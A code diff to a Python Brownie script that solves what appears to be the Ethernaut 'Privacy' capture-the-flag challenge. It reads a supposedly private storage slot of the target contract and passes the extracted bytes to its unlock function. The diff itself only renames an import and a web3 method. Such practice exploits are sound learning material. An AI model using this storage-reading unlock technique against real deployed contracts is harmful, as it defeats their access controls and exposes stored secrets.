@@ -1,4 +1,4 @@
-from scripts.helper.context import *
+from scripts.helper.utils import *
 from scripts.helper.account import _from, acc
 from scripts.helper.web3 import web3
 from brownie import Privacy
@@ -14,7 +14,7 @@ def solve_challenge():
 
     # get bytes32 object in storage position 0x5
     # that's where the third element of data is located (solidity is 0-index as nature was supposed to be)
-    data_2 = web3.toBytes(hexstr=web3.eth.getStorageAt(privacy.address, '0x5').hex())[0:16].hex()
+    data_2 = web3.toBytes(hexstr=web3.eth.get_storage_at(privacy.address, '0x5').hex())[0:16].hex()
 
     # call unlock function passing in data_2
     privacy.unlock(data_2, _from)
